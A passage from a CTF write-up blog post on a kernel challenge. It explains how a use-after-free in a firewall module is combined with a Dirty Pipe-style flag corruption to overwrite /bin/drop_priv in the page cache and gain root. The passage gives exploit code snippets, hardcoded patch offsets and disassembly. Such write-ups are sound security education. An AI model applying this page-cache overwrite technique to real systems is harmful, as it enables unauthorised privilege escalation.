+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#bbb">    </span><span style="color:#007020;font-weight:bold">let</span><span style="color:#bbb"> </span>pb<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span>pipe_buffer_leak(<span style="color:#666">&amp;</span>leak);<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#bbb">    </span><span style="color:#06287e">println!</span>(<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#bbb">        </span><span style="color:#4070a0">&#34;[leak idx </span><span style="color:#70a0d0">{}</span><span style="color:#4070a0">] page=0x</span><span style="color:#70a0d0">{:016x}</span><span style="color:#4070a0"> offset=0x</span><span style="color:#70a0d0">{:x}</span><span style="color:#4070a0"> len=</span><span style="color:#70a0d0">{}</span><span style="color:#4070a0"> ops=0x</span><span style="color:#70a0d0">{:016x}</span><span style="color:#4070a0"> flags=0x</span><span style="color:#70a0d0">{:x}</span><span style="color:#4070a0"> private=0x</span><span style="color:#70a0d0">{:016x}</span><span style="color:#4070a0">&#34;</span>,<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span><span style="color:#bbb">        </span>idxs[<span style="color:#40a070">0</span>],<span style="color:#bbb"> </span>pb.page,<span style="color:#bbb"> </span>pb.offset,<span style="color:#bbb"> </span>pb.len,<span style="color:#bbb"> </span>pb.ops,<span style="color:#bbb"> </span>pb.flags,<span style="color:#bbb"> </span>pb.private<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#bbb">    </span>);<span style="color:#bbb">
+</span></span></span></code></pre></div><h2 id="dirty-pipe">Dirty Pipe</h2>
+<p>Obviously, we will later corrupt data through the <code>FW_EDIT_RULE</code> operation. The real question is what to corrupt. The usual way is to corrupt the function table (<code>ops</code>), but remember <code>drop_priv</code> -  it is a perfect target for a <a href="https://dirtypipe.cm4all.com/">Dirty Pipe-style attack</a>.</p>
+<p>If you are not familiar with this technique, I suggest reading:</p>
+<ol>
+<li><a href="https://dirtypipe.cm4all.com">https://dirtypipe.cm4all.com</a></li>
+<li><a href="https://0xnull007.github.io/posts/dirtypipe-cve-2022-0847">https://0xnull007.github.io/posts/dirtypipe-cve-2022-0847</a></li>
+<li><a href="https://stdnoerr.blog/blog/DirtyPipe-CVE-2022-0847">https://stdnoerr.blog/blog/DirtyPipe-CVE-2022-0847</a></li>
+</ol>
+<p>To be clear, this is not exploiting CVE-2022-0847 directly. In the original Dirty Pipe bug, stale pipe buffer flags were accidentally preserved by the kernel after filling and draining a pipe. Here, the firewall UAF gives us a direct stale write into a reclaimed <code>pipe_buffer</code> array, so we set <code>PIPE_BUF_FLAG_CAN_MERGE</code> ourselves with <code>FW_EDIT_RULE</code>.</p>
+<p>For this challenge, the write primitive is:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>1. Drain the chosen pipe.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>2. Splice data from /bin/drop_priv at target_off - 1.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>3. Corrupt the new file-backed pipe_buffer flags through FW_EDIT_RULE.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>4. Write four zero bytes.
+</span></span></code></pre></div><p>Since the spliced byte starts immediately before the target immediate, the following write merges into the page cache at exactly the offset we want.
+This lets us patch the <code>drop_priv:main</code> immediates from <code>1000</code> to <code>0</code>, which gives us a root shell after killing the current shell and letting init respawn <code>drop_priv</code>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Since the exploitation process is already well-covered by the links above, I’ll focus on insights specific to this chal.
+At this point, the heap state should look like this:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>rules[hit_idx]   -&gt; stale pointer
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>                 -&gt; reclaimed kmalloc-1024 chunk
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>                 -&gt; struct pipe_buffer bufs[16]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>pipes[hit_pipe] -&gt; userspace fd pair backed by the same pipe_buffer array
+</span></span></code></pre></div><p>The initial <code>write(pipefd[1], tag, i + 1)</code> populated slot 0. That slot is only used as a marker:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>bufs[0].len = i + 1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>hit_pipe = bufs[0].len - 1
+</span></span></code></pre></div><p>The stale rule gives us byte writes into the <code>pipe_buffer</code> array. The field we care about is:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>struct pipe_buffer {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    struct page *page;        // +0x00
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    unsigned int offset;      // +0x08
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    unsigned int len;         // +0x0c
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    const struct pipe_buf_operations *ops; // +0x10
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>    unsigned int flags;       // +0x18
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    unsigned long private;    // +0x20
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>};                            // sizeof = 0x28
+</span></span></code></pre></div><p>So for any slot in the ring:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>flags_off(slot) = 0x18 + slot * 0x28
+</span></span></code></pre></div><p>The first marked buffer uses slot 0, so I use the next slots for file-backed buffers:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>slot 1 -&gt; patch gid local immediate
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>slot 2 -&gt; patch setgid(1000)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>slot 3 -&gt; patch setuid(1000)
+</span></span></code></pre></div><p>For each target offset in <code>/bin/drop_priv</code>, the primitive is:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>pipe_drain(pipe[hit_pipe][0])
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>splice(drop_priv_fd, target_off - 1, pipe[hit_pipe][1], NULL, 1, 0)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>FW_EDIT_RULE(hit_idx, flags_off(slot), PIPE_BUF_FLAG_CAN_MERGE)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>write(pipe[hit_pipe][1], &#34;\x00\x00\x00\x00&#34;, 4)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>pipe_drain(pipe[hit_pipe][0])
+</span></span></code></pre></div><p><code>splice()</code> inserts a file-backed <code>pipe_buffer</code> into the pipe ring. Its <code>page</code> points to the page cache page of <code>/bin/drop_priv</code>, and its <code>offset/len</code> describe the one byte at <code>target_off - 1</code>.</p>
+<p>After that, setting <code>PIPE_BUF_FLAG_CAN_MERGE</code> changes how the following <code>write()</code> is handled. Instead of allocating a fresh anonymous pipe page, the kernel appends into the existing file-backed page cache buffer. Since the spliced byte is at <code>target_off - 1</code>, the four zero bytes land exactly at <code>target_off</code>.</p>
+<p>The patch offsets are resolved once with <code>objdump</code> or <code>rizin</code> and then hardcoded in the exploit. The relevant part of <code>drop_priv::main</code> is:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="">00000000004017</span><span style="color:#06287e">b5</span> <span style="">&lt;</span><span style="color:#60add5">main</span><span style="">&gt;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>  <span style="">4017</span><span style="color:#002070;font-weight:bold">d0:</span> <span style="color:#06287e">c7</span> <span style="color:#40a070">45</span> <span style="color:#60add5">f4</span> <span style="color:#60add5">e8</span> <span style="color:#40a070">03</span> <span style="color:#40a070">00</span> <span style="color:#40a070">00</span>    <span style="color:#60add5">mov</span>    <span style="color:#60add5">DWORD</span> <span style="color:#60add5">PTR</span> [<span style="color:#60add5">rbp-0xc</span>],<span style="color:#40a070">0x3e8</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  <span style="">4017</span><span style="color:#002070;font-weight:bold">d7:</span> <span style="">48</span> <span style="">8</span><span style="color:#06287e">d</span> <span style="color:#40a070">45</span> <span style="color:#60add5">f4</span>              <span style="color:#60add5">lea</span>    <span style="color:#60add5">rax</span>,[<span style="color:#60add5">rbp-0xc</span>]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>  <span style="">4017</span><span style="color:#002070;font-weight:bold">db:</span> <span style="">48</span> <span style="">89</span> <span style="color:#06287e">c6</span>                 <span style="color:#60add5">mov</span>    <span style="color:#60add5">rsi</span>,<span style="color:#60add5">rax</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="">4017</span><span style="color:#002070;font-weight:bold">de:</span> <span style="color:#06287e">bf</span> <span style="color:#40a070">01</span> <span style="color:#40a070">00</span> <span style="color:#40a070">00</span> <span style="color:#40a070">00</span>           <span style="color:#60add5">mov</span>    <span style="color:#60add5">edi</span>,<span style="color:#40a070">0x1</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>  <span style="">4017</span><span style="color:#002070;font-weight:bold">e3:</span> <span style="color:#06287e">e8</span> <span style="color:#60add5">f8</span> <span style="color:#40a070">4</span><span style="color:#60add5">f</span> <span style="color:#40a070">04</span> <span style="color:#40a070">00</span>           <span style="color:#60add5">call</span>   <span style="color:#60add5">setgroups</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>  <span style="">4017</span><span style="color:#002070;font-weight:bold">e8:</span> <span style="color:#06287e">bf</span> <span style="color:#60add5">e8</span> <span style="color:#40a070">03</span> <span style="color:#40a070">00</span> <span style="color:#40a070">00</span>           <span style="color:#60add5">mov</span>    <span style="color:#60add5">edi</span>,<span style="color:#40a070">0x3e8</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>  <span style="">4017</span><span style="color:#002070;font-weight:bold">ed:</span> <span style="color:#06287e">e8</span> <span style="color:#40a070">5</span><span style="color:#60add5">e</span> <span style="color:#40a070">53</span> <span style="color:#40a070">04</span> <span style="color:#40a070">00</span>           <span style="color:#60add5">call</span>   <span style="color:#60add5">setgid</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>  <span style="">4017</span><span style="color:#002070;font-weight:bold">f2:</span> <span style="color:#06287e">bf</span> <span style="color:#60add5">e8</span> <span style="color:#40a070">03</span> <span style="color:#40a070">00</span> <span style="color:#40a070">00</span>           <span style="color:#60add5">mov</span>    <span style="color:#60add5">edi</span>,<span style="color:#40a070">0x3e8</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>  <span style="">4017</span><span style="color:#002070;font-weight:bold">f7:</span> <span style="color:#06287e">e8</span> <span style="color:#60add5">d4</span> <span style="color:#40a070">52</span> <span style="color:#40a070">04</span> <span style="color:#40a070">00</span>           <span style="color:#60add5">call</span>   <span style="color:#60add5">setuid</span>
+</span></span></code></pre></div><p>Dirty Pipe writes use file offsets, not virtual addresses. <code>drop_priv</code> is a non-PIE static ELF whose text is based at <code>0x400000</code>, so the immediate offsets are:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>0x4017d3 - 0x400000 = 0x17d3  // gid_t gid = 1000
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>0x4017e9 - 0x400000 = 0x17e9  // setgid(1000)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>0x4017f3 - 0x400000 = 0x17f3  // setuid(1000)
+</span></span></code></pre></div><p>In the final exploit I just hardcode them:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#007020;font-weight:bold">const</span><span style="color:#bbb"> </span><span style="color:#60add5">DROP_PRIV_PATCH_OFFSETS</span>: [<span style="color:#902000">u64</span>;<span style="color:#bbb"> </span><span style="color:#40a070">3</span>]<span style="color:#bbb"> </span><span style="color:#666">=</span><span style="color:#bbb"> </span>[<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#bbb">    </span><span style="color:#40a070">0x17d3</span>,<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#bbb">    </span><span style="color:#40a070">0x17e9</span>,<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span><span style="color:#bbb">    </span><span style="color:#40a070">0x17f3</span>,<span style="color:#bbb">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span><span style="color:#bbb"></span>];<span style="color:#bbb">
+</span></span></span></code></pre></div><p>Those immediates correspond to:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#902000">gid_t</span> gid <span style="color:#666">=</span> <span style="color:#40a070">1000</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#06287e">setgid</span>(<span style="color:#40a070">1000</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#06287e">setuid</span>(<span style="color:#40a070">1000</span>);
+</span></span></code></pre></div><p>After the three four-byte page-cache writes, the code behaves like:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#902000">gid_t</span> gid <span style="color:#666">=</span> <span style="color:#40a070">0</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#06287e">setgid</span>(<span style="color:#40a070">0</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#06287e">setuid</span>(<span style="color:#40a070">0</span>);
+</span></span></code></pre></div><p>The last step is just process control. The current shell is still the child of <code>drop_priv</code>, so killing its parent returns execution to init. The init script keeps running:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#007020;font-weight:bold">while</span> true; <span style="color:#007020;font-weight:bold">do</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    /bin/drop_priv
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span><span style="color:#007020;font-weight:bold">done</span>
+</span></span></code></pre></div><p>The next <code>/bin/drop_priv</code> run uses the patched page cache version, keeps uid/gid 0, and executes <code>/bin/sh</code>.</p>
+<p>Here is the run from the VM:
+<img src="/images/tw_3.png" alt="alt text"></p>
+<p>Full source code can be found <a href="https://github.com/icctx/ctf/tree/main/b01lers.2026/throughthewall/x/src">here</a>.</p>
+<hr>
+<h1 id="conclusion">Conclusion</h1>
+<p>Hope you enjoyed the post!
+Feel free to reach out if you’ve got any questions.
+The next part will cover a harder &ldquo;multifiles&rdquo; challenge (hopefully, I’ll get my hands on writing it soon).</p>
+
+</content>
+
+
+
+<p>
+  
+  <a href="http://localhost:1313/tags/kernel/">#Kernel</a>
+  
+  <a href="http://localhost:1313/tags/pwn/">#Pwn</a>
+  
+</p>
+
+  </main>
+  <footer>
+</footer>
+
+  
+</body>
+
+</html>
